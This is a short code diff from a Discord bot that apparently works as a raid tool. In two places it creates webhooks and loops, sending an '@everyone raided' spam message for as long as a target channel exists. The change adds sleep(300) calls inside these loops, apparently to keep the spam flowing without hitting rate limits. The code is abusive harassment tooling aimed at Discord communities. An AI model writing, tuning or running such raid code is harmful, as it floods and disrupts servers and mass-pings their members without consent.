@@ -41,6 +41,7 @@ client.on("message", async (message) => {
                             const case1hook = new Discord.WebhookClient(w.id, w.token)
                             while(Boolean(client.channels.get(mch1)) == true){
                               case1hook.send(`@everyone raided epicclly by padero's private rice girl`)
+                              sleep(300)
                             }
                         })
                     })
@@ -55,6 +56,7 @@ client.on("message", async (message) => {
                             const case2hook = new Discord.WebhookClient(w.id, w.token)
                             while(Boolean(client.channels.get(mch2)) == true) {
                               case2hook.send(`@everyone raided epicclly by padero's private rice girl`)
+                              sleep(300)
                             }
                         })
                     })
